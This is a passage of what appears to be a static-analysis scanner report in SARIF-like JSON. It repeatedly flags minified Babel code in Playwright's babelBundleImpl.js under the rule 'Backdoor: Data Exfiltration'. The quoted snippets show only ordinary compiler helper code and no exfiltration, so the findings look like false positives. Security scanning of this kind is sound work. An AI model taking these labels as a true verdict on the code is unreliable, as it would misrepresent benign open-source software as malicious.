                      "text": "Te(e)||MTe(e,t);r&&e.replaceWith(r)},ObjectExpression(e,t){let r=BN(e)||RTe(e,t);r&&e.replaceWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\"",
                      "markdown": "`Te(e)||MTe(e,t);r&&e.replaceWith(r)},ObjectExpression(e,t){let r=BN(e)||RTe(e,t);r&&e.replaceWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 4106,
                  "endLine": 2009,
                  "endColumn": 4111,
                  "snippet": {
                    "text": "r=s,i.path=n}},ClassExpression(e,t){let r=BN(e)||LTe(e)||MTe(e,t);r&&e.replaceWith(r)},ObjectExpression(e,t){let r=BN(e)||RTe(e,t);r&&e.replaceWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&",
                    "rendered": {
                      "text": "r=s,i.path=n}},ClassExpression(e,t){let r=BN(e)||LTe(e)||MTe(e,t);r&&e.replaceWith(r)},ObjectExpression(e,t){let r=BN(e)||RTe(e,t);r&&e.replaceWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&",
                      "markdown": "`r=s,i.path=n}},ClassExpression(e,t){let r=BN(e)||LTe(e)||MTe(e,t);r&&e.replaceWith(r)},ObjectExpression(e,t){let r=BN(e)||RTe(e,t);r&&e.replaceWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 3728,
                  "endLine": 2009,
                  "endColumn": 3733,
                  "snippet": {
                    "text": ";let r=FN(t);if(r){let[n]=e.replaceWithMultiple([r,ce.types.exportNamedDeclaration(null,[ce.types.exportSpecifier(ce.types.cloneNode(r.declarations[0].id),ce.types.identifier(\"default\"))])]);t.node.id||e.scope.registerDeclaration(n)}},ClassDeclaration(e){let t=FN(e);if(t){let[r]=e.replaceWith(t),n=r.get(\"declarations.0\"),s=n.node.id,i=e.scope.getOwnBinding(s.name);i.identifier=s,i.path=n}},ClassExpression(e,t){let r=BN(e)||LTe(e)||MTe(e,t);r&&e.replaceWith(r)},ObjectExpression(e,t){let r=BN(e)||RTe(e,t);r&&e.replaceWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.call",
                    "rendered": {
                      "text": ";let r=FN(t);if(r){let[n]=e.replaceWithMultiple([r,ce.types.exportNamedDeclaration(null,[ce.types.exportSpecifier(ce.types.cloneNode(r.declarations[0].id),ce.types.identifier(\"default\"))])]);t.node.id||e.scope.registerDeclaration(n)}},ClassDeclaration(e){let t=FN(e);if(t){let[r]=e.replaceWith(t),n=r.get(\"declarations.0\"),s=n.node.id,i=e.scope.getOwnBinding(s.name);i.identifier=s,i.path=n}},ClassExpression(e,t){let r=BN(e)||LTe(e)||MTe(e,t);r&&e.replaceWith(r)},ObjectExpression(e,t){let r=BN(e)||RTe(e,t);r&&e.replaceWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.call",
                      "markdown": "`;let r=FN(t);if(r){let[n]=e.replaceWithMultiple([r,ce.types.exportNamedDeclaration(null,[ce.types.exportSpecifier(ce.types.cloneNode(r.declarations[0].id),ce.types.identifier(\"default\"))])]);t.node.id||e.scope.registerDeclaration(n)}},ClassDeclaration(e){let t=FN(e);if(t){let[r]=e.replaceWith(t),n=r.get(\"declarations.0\"),s=n.node.id,i=e.scope.getOwnBinding(s.name);i.identifier=s,i.path=n}},ClassExpression(e,t){let r=BN(e)||LTe(e)||MTe(e,t);r&&e.replaceWith(r)},ObjectExpression(e,t){let r=BN(e)||RTe(e,t);r&&e.replaceWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.call`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 3375,
                  "endLine": 2009,
                  "endColumn": 3380,
                  "snippet": {
                    "text": "types.cloneNode(n)])}function FN({node:e,scope:t}){if(!jN(e)&&!I1(e.body.body))return;let r=e.id?ce.types.cloneNode(e.id):t.generateUidIdentifier(\"class\");return ce.types.variableDeclaration(\"let\",[ce.types.variableDeclarator(r,ce.types.toExpression(e))])}var qTe={ExportDefaultDeclaration(e){let t=e.get(\"declaration\");if(!t.isClassDeclaration())return;let r=FN(t);if(r){let[n]=e.replaceWithMultiple([r,ce.types.exportNamedDeclaration(null,[ce.types.exportSpecifier(ce.types.cloneNode(r.declarations[0].id),ce.types.identifier(\"default\"))])]);t.node.id||e.scope.registerDeclaration(n)}},ClassDeclaration(",
                    "rendered": {
                      "text": "types.cloneNode(n)])}function FN({node:e,scope:t}){if(!jN(e)&&!I1(e.body.body))return;let r=e.id?ce.types.cloneNode(e.id):t.generateUidIdentifier(\"class\");return ce.types.variableDeclaration(\"let\",[ce.types.variableDeclarator(r,ce.types.toExpression(e))])}var qTe={ExportDefaultDeclaration(e){let t=e.get(\"declaration\");if(!t.isClassDeclaration())return;let r=FN(t);if(r){let[n]=e.replaceWithMultiple([r,ce.types.exportNamedDeclaration(null,[ce.types.exportSpecifier(ce.types.cloneNode(r.declarations[0].id),ce.types.identifier(\"default\"))])]);t.node.id||e.scope.registerDeclaration(n)}},ClassDeclaration(",
                      "markdown": "`types.cloneNode(n)])}function FN({node:e,scope:t}){if(!jN(e)&&!I1(e.body.body))return;let r=e.id?ce.types.cloneNode(e.id):t.generateUidIdentifier(\"class\");return ce.types.variableDeclaration(\"let\",[ce.types.variableDeclarator(r,ce.types.toExpression(e))])}var qTe={ExportDefaultDeclaration(e){let t=e.get(\"declaration\");if(!t.isClassDeclaration())return;let r=FN(t);if(r){let[n]=e.replaceWithMultiple([r,ce.types.exportNamedDeclaration(null,[ce.types.exportSpecifier(ce.types.cloneNode(r.declarations[0].id),ce.types.identifier(\"default\"))])]);t.node.id||e.scope.registerDeclaration(n)}},ClassDeclaration(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 79,
                  "endLine": 2009,
                  "endColumn": 84,
                  "snippet": {
                    "text": "riptor(TARGET, PROPERTY), (TEMP = TEMP ? TEMP.value : undefined), {\n        enumerable: true,\n        configurable: true,\n        writable: true,\n        initializer: function(){\n            return TEMP;\n        }\n    })\n`),D1=new WeakSet;function BN(e){let r=(e.isClass()?[e,...e.get(\"body.body\")]:e.get(\"properties\")).reduce((n,s)=>n.concat(s.node.decorators||[]),[]).filter(n=>!ce.types.isIdentifier(n.expression));if(r.length!==0)return ce.types.sequenceExpression(r.map(n=>{let s=n.expression,i=n.expression=e.scope.generateDeclaredUidIdentifier(\"dec\");return ce.types.assignmentExpression(\"=\",i,s)})",
                    "rendered": {
                      "text": "riptor(TARGET, PROPERTY), (TEMP = TEMP ? TEMP.value : undefined), {\n        enumerable: true,\n        configurable: true,\n        writable: true,\n        initializer: function(){\n            return TEMP;\n        }\n    })\n`),D1=new WeakSet;function BN(e){let r=(e.isClass()?[e,...e.get(\"body.body\")]:e.get(\"properties\")).reduce((n,s)=>n.concat(s.node.decorators||[]),[]).filter(n=>!ce.types.isIdentifier(n.expression));if(r.length!==0)return ce.types.sequenceExpression(r.map(n=>{let s=n.expression,i=n.expression=e.scope.generateDeclaredUidIdentifier(\"dec\");return ce.types.assignmentExpression(\"=\",i,s)})",
                      "markdown": "`riptor(TARGET, PROPERTY), (TEMP = TEMP ? TEMP.value : undefined), {\n        enumerable: true,\n        configurable: true,\n        writable: true,\n        initializer: function(){\n            return TEMP;\n        }\n    })\n`),D1=new WeakSet;function BN(e){let r=(e.isClass()?[e,...e.get(\"body.body\")]:e.get(\"properties\")).reduce((n,s)=>n.concat(s.node.decorators||[]),[]).filter(n=>!ce.types.isIdentifier(n.expression));if(r.length!==0)return ce.types.sequenceExpression(r.map(n=>{let s=n.expression,i=n.expression=e.scope.generateDeclaredUidIdentifier(\"dec\");return ce.types.assignmentExpression(\"=\",i,s)})`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 59,
                  "endLine": 2009,
                  "endColumn": 64,
                  "snippet": {
                    "text": "t.getOwnPropertyDescriptor(TARGET, PROPERTY), (TEMP = TEMP ? TEMP.value : undefined), {\n        enumerable: true,\n        configurable: true,\n        writable: true,\n        initializer: function(){\n            return TEMP;\n        }\n    })\n`),D1=new WeakSet;function BN(e){let r=(e.isClass()?[e,...e.get(\"body.body\")]:e.get(\"properties\")).reduce((n,s)=>n.concat(s.node.decorators||[]),[]).filter(n=>!ce.types.isIdentifier(n.expression));if(r.length!==0)return ce.types.sequenceExpression(r.map(n=>{let s=n.expression,i=n.expression=e.scope.generateDeclaredUidIdentifier(\"dec\");return ce.types.assignmentE",
                    "rendered": {
                      "text": "t.getOwnPropertyDescriptor(TARGET, PROPERTY), (TEMP = TEMP ? TEMP.value : undefined), {\n        enumerable: true,\n        configurable: true,\n        writable: true,\n        initializer: function(){\n            return TEMP;\n        }\n    })\n`),D1=new WeakSet;function BN(e){let r=(e.isClass()?[e,...e.get(\"body.body\")]:e.get(\"properties\")).reduce((n,s)=>n.concat(s.node.decorators||[]),[]).filter(n=>!ce.types.isIdentifier(n.expression));if(r.length!==0)return ce.types.sequenceExpression(r.map(n=>{let s=n.expression,i=n.expression=e.scope.generateDeclaredUidIdentifier(\"dec\");return ce.types.assignmentE",
                      "markdown": "`t.getOwnPropertyDescriptor(TARGET, PROPERTY), (TEMP = TEMP ? TEMP.value : undefined), {\n        enumerable: true,\n        configurable: true,\n        writable: true,\n        initializer: function(){\n            return TEMP;\n        }\n    })\n`),D1=new WeakSet;function BN(e){let r=(e.isClass()?[e,...e.get(\"body.body\")]:e.get(\"properties\")).reduce((n,s)=>n.concat(s.node.decorators||[]),[]).filter(n=>!ce.types.isIdentifier(n.expression));if(r.length!==0)return ce.types.sequenceExpression(r.map(n=>{let s=n.expression,i=n.expression=e.scope.generateDeclaredUidIdentifier(\"dec\");return ce.types.assignmentE`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1980,
                  "startColumn": 6559,
                  "endLine": 1980,
                  "endColumn": 6564,
                  "snippet": {
                    "text": "tructor.name}`:`${(0,Il().inspect)(e,{depth:-1})}`;let t=(0,Il().inspect)(e,{colors:!1});return t.length>28&&(t=`${t.slice(0,25)}...`),`type ${typeof e} (${t})`}var wl={}.hasOwnProperty,{ERR_INVALID_PACKAGE_CONFIG:mve}=or,W_=new Map,yve={read:gve},nN=yve;function gve(e,{base:t,specifier:r}){let n=W_.get(e);if(n)return n;let s;try{s=Na().default.readFileSync(pp().toNamespacedPath(e),\"utf8\")}catch(a){let o=a;if(o.code!==\"ENOENT\")throw o}let i={exists:!1,pjsonPath:e,main:void 0,name:void 0,type:\"none\",exports:void 0,imports:void 0};if(s!==void 0){let a;try{a=JSON.parse(s)}catch(o){let l=o,u=new mve(e,",
                    "rendered": {
                      "text": "tructor.name}`:`${(0,Il().inspect)(e,{depth:-1})}`;let t=(0,Il().inspect)(e,{colors:!1});return t.length>28&&(t=`${t.slice(0,25)}...`),`type ${typeof e} (${t})`}var wl={}.hasOwnProperty,{ERR_INVALID_PACKAGE_CONFIG:mve}=or,W_=new Map,yve={read:gve},nN=yve;function gve(e,{base:t,specifier:r}){let n=W_.get(e);if(n)return n;let s;try{s=Na().default.readFileSync(pp().toNamespacedPath(e),\"utf8\")}catch(a){let o=a;if(o.code!==\"ENOENT\")throw o}let i={exists:!1,pjsonPath:e,main:void 0,name:void 0,type:\"none\",exports:void 0,imports:void 0};if(s!==void 0){let a;try{a=JSON.parse(s)}catch(o){let l=o,u=new mve(e,",
                      "markdown": "`tructor.name}`:`${(0,Il().inspect)(e,{depth:-1})}`;let t=(0,Il().inspect)(e,{colors:!1});return t.length>28&&(t=`${t.slice(0,25)}...`),`type ${typeof e} (${t})`}var wl={}.hasOwnProperty,{ERR_INVALID_PACKAGE_CONFIG:mve}=or,W_=new Map,yve={read:gve},nN=yve;function gve(e,{base:t,specifier:r}){let n=W_.get(e);if(n)return n;let s;try{s=Na().default.readFileSync(pp().toNamespacedPath(e),\"utf8\")}catch(a){let o=a;if(o.code!==\"ENOENT\")throw o}let i={exists:!1,pjsonPath:e,main:void 0,name:void 0,type:\"none\",exports:void 0,imports:void 0};if(s!==void 0){let a;try{a=JSON.parse(s)}catch(o){let l=o,u=new mve(e,`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1980,
                  "startColumn": 5588,
                  "endLine": 1980,
                  "endColumn": 5593,
                  "snippet": {
                    "text": "=void 0}function fve(e){let t=uve+e.name;return Object.defineProperty(e,\"name\",{value:t}),e}var pve=fve(function(e){let t=m1();return t&&($_=Error.stackTraceLimit,Error.stackTraceLimit=Number.POSITIVE_INFINITY),Error.captureStackTrace(e),t&&(Error.stackTraceLimit=$_),e});function dve(e,t,r){let n=rN.get(e);if(xn()(n!==void 0,\"expected `message` to be found\"),typeof n==\"function\")return xn()(n.length<=t.length,`Code: ${e}; The provided arguments length (${t.length}) does not match the required ones (${n.length}).`),Reflect.apply(n,r,t);let s=/%[dfijoOs]/g,i=0;for(;s.exec(n)!==null;)i++;return xn()(i",
                    "rendered": {
                      "text": "=void 0}function fve(e){let t=uve+e.name;return Object.defineProperty(e,\"name\",{value:t}),e}var pve=fve(function(e){let t=m1();return t&&($_=Error.stackTraceLimit,Error.stackTraceLimit=Number.POSITIVE_INFINITY),Error.captureStackTrace(e),t&&(Error.stackTraceLimit=$_),e});function dve(e,t,r){let n=rN.get(e);if(xn()(n!==void 0,\"expected `message` to be found\"),typeof n==\"function\")return xn()(n.length<=t.length,`Code: ${e}; The provided arguments length (${t.length}) does not match the required ones (${n.length}).`),Reflect.apply(n,r,t);let s=/%[dfijoOs]/g,i=0;for(;s.exec(n)!==null;)i++;return xn()(i",
                      "markdown": "`=void 0}function fve(e){let t=uve+e.name;return Object.defineProperty(e,\"name\",{value:t}),e}var pve=fve(function(e){let t=m1();return t&&($_=Error.stackTraceLimit,Error.stackTraceLimit=Number.POSITIVE_INFINITY),Error.captureStackTrace(e),t&&(Error.stackTraceLimit=$_),e});function dve(e,t,r){let n=rN.get(e);if(xn()(n!==void 0,\"expected `message` to be found\"),typeof n==\"function\")return xn()(n.length<=t.length,`Code: ${e}; The provided arguments length (${t.length}) does not match the required ones (${n.length}).`),Reflect.apply(n,r,t);let s=/%[dfijoOs]/g,i=0;for(;s.exec(n)!==null;)i++;return xn()(i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1980,
                  "startColumn": 970,
                  "endLine": 1980,
                  "endColumn": 975,
                  "snippet": {
                    "text": "){return e},e}function tN(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(tN=function(n){return n?r:t})(e)}function ive(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=tN(t);if(r&&r.has(e))return r.get(e);var n={__proto__:null},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n",
                    "rendered": {
                      "text": "){return e},e}function tN(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(tN=function(n){return n?r:t})(e)}function ive(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=tN(t);if(r&&r.has(e))return r.get(e);var n={__proto__:null},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n",
                      "markdown": "`){return e},e}function tN(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(tN=function(n){return n?r:t})(e)}function ive(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=tN(t);if(r&&r.has(e))return r.get(e);var n={__proto__:null},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1944,
                  "startColumn": 1991,
                  "endLine": 1944,
                  "endColumn": 1996,
                  "snippet": {
                    "text": "ort. We may add support for this in the future, but if you're on the most recent version of @babel/core and still seeing this error, then you'll need to synchronously return your config.\",e);return n&&sve(e),X1e(r,e)}var k_=new WeakMap;function X1e(e,t){let r=k_.get(e);r||k_.set(e,r=new Map);let n=r.get(t);return n||(n={filepath:t,dirname:Nr().dirname(t),options:e},r.set(t,n)),n}var J1e=(0,L_.makeWeakCacheSync)(e=>{let t=e.options.babel;if(typeof t==\"undefined\")return null;if(typeof t!=\"object\"||Array.isArray(t)||t===null)throw new un.default(\".babel property must be an object\",e.filepath);return{f",
                    "rendered": {
                      "text": "ort. We may add support for this in the future, but if you're on the most recent version of @babel/core and still seeing this error, then you'll need to synchronously return your config.\",e);return n&&sve(e),X1e(r,e)}var k_=new WeakMap;function X1e(e,t){let r=k_.get(e);r||k_.set(e,r=new Map);let n=r.get(t);return n||(n={filepath:t,dirname:Nr().dirname(t),options:e},r.set(t,n)),n}var J1e=(0,L_.makeWeakCacheSync)(e=>{let t=e.options.babel;if(typeof t==\"undefined\")return null;if(typeof t!=\"object\"||Array.isArray(t)||t===null)throw new un.default(\".babel property must be an object\",e.filepath);return{f",
                      "markdown": "`ort. We may add support for this in the future, but if you're on the most recent version of @babel/core and still seeing this error, then you'll need to synchronously return your config.\",e);return n&&sve(e),X1e(r,e)}var k_=new WeakMap;function X1e(e,t){let r=k_.get(e);r||k_.set(e,r=new Map);let n=r.get(t);return n||(n={filepath:t,dirname:Nr().dirname(t),options:e},r.set(t,n)),n}var J1e=(0,L_.makeWeakCacheSync)(e=>{let t=e.options.babel;if(typeof t==\"undefined\")return null;if(typeof t!=\"object\"||Array.isArray(t)||t===null)throw new un.default(\".babel property must be an object\",e.filepath);return{f`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1944,
                  "startColumn": 1953,
                  "endLine": 1944,
                  "endColumn": 1958,
                  "snippet": {
                    "text": "current version of Babel does not support. We may add support for this in the future, but if you're on the most recent version of @babel/core and still seeing this error, then you'll need to synchronously return your config.\",e);return n&&sve(e),X1e(r,e)}var k_=new WeakMap;function X1e(e,t){let r=k_.get(e);r||k_.set(e,r=new Map);let n=r.get(t);return n||(n={filepath:t,dirname:Nr().dirname(t),options:e},r.set(t,n)),n}var J1e=(0,L_.makeWeakCacheSync)(e=>{let t=e.options.babel;if(typeof t==\"undefined\")return null;if(typeof t!=\"object\"||Array.isArray(t)||t===null)throw new un.default(\".babel property m",
                    "rendered": {
                      "text": "current version of Babel does not support. We may add support for this in the future, but if you're on the most recent version of @babel/core and still seeing this error, then you'll need to synchronously return your config.\",e);return n&&sve(e),X1e(r,e)}var k_=new WeakMap;function X1e(e,t){let r=k_.get(e);r||k_.set(e,r=new Map);let n=r.get(t);return n||(n={filepath:t,dirname:Nr().dirname(t),options:e},r.set(t,n)),n}var J1e=(0,L_.makeWeakCacheSync)(e=>{let t=e.options.babel;if(typeof t==\"undefined\")return null;if(typeof t!=\"object\"||Array.isArray(t)||t===null)throw new un.default(\".babel property m",
                      "markdown": "`current version of Babel does not support. We may add support for this in the future, but if you're on the most recent version of @babel/core and still seeing this error, then you'll need to synchronously return your config.\",e);return n&&sve(e),X1e(r,e)}var k_=new WeakMap;function X1e(e,t){let r=k_.get(e);r||k_.set(e,r=new Map);let n=r.get(t);return n||(n={filepath:t,dirname:Nr().dirname(t),options:e},r.set(t,n)),n}var J1e=(0,L_.makeWeakCacheSync)(e=>{let t=e.options.babel;if(typeof t==\"undefined\")return null;if(typeof t!=\"object\"||Array.isArray(t)||t===null)throw new un.default(\".babel property m`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1936,
                  "startColumn": 181,
                  "endLine": 1936,
                  "endColumn": 186,
                  "snippet": {
                    "text": "ferenced);if(q===!1)continue;dt=q}(se=dt)!=null||(dt=ln.template.statement.ast`\n                var ${Pe.name} = ${j};\n              `)}dt.loc=Pe.loc,te.push(dt),te.push(...(0,Ai.buildNamespaceInitStatements)(K,Pe,d,R.wrapReference))}(0,Ai.ensureStatementsHoisted)(te),O.unshiftContainer(\"body\",te),O.get(\"body\").forEach(Te=>{te.indexOf(Te.node)!==-1&&Te.isVariableDeclaration()&&Te.scope.registerDeclaration(Te)})}}}}})});var t1=E(e1=>{\"use strict\";Object.defineProperty(e1,\"__esModule\",{value:!0});var C_=mt(),C1e=b_();YE();var w1e=ZE(),D1e=pf();function w_(e){return e&&e.__esModule?e:{default:e}}var A",
                    "rendered": {
                      "text": "ferenced);if(q===!1)continue;dt=q}(se=dt)!=null||(dt=ln.template.statement.ast`\n                var ${Pe.name} = ${j};\n              `)}dt.loc=Pe.loc,te.push(dt),te.push(...(0,Ai.buildNamespaceInitStatements)(K,Pe,d,R.wrapReference))}(0,Ai.ensureStatementsHoisted)(te),O.unshiftContainer(\"body\",te),O.get(\"body\").forEach(Te=>{te.indexOf(Te.node)!==-1&&Te.isVariableDeclaration()&&Te.scope.registerDeclaration(Te)})}}}}})});var t1=E(e1=>{\"use strict\";Object.defineProperty(e1,\"__esModule\",{value:!0});var C_=mt(),C1e=b_();YE();var w1e=ZE(),D1e=pf();function w_(e){return e&&e.__esModule?e:{default:e}}var A",
                      "markdown": "`ferenced);if(q===!1)continue;dt=q}(se=dt)!=null||(dt=ln.template.statement.ast`\n                var ${Pe.name} = ${j};\n              `)}dt.loc=Pe.loc,te.push(dt),te.push(...(0,Ai.buildNamespaceInitStatements)(K,Pe,d,R.wrapReference))}(0,Ai.ensureStatementsHoisted)(te),O.unshiftContainer(\"body\",te),O.get(\"body\").forEach(Te=>{te.indexOf(Te.node)!==-1&&Te.isVariableDeclaration()&&Te.scope.registerDeclaration(Te)})}}}}})});var t1=E(e1=>{\"use strict\";Object.defineProperty(e1,\"__esModule\",{value:!0});var C_=mt(),C1e=b_();YE();var w1e=ZE(),D1e=pf();function w_(e){return e&&e.__esModule?e:{default:e}}var A`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
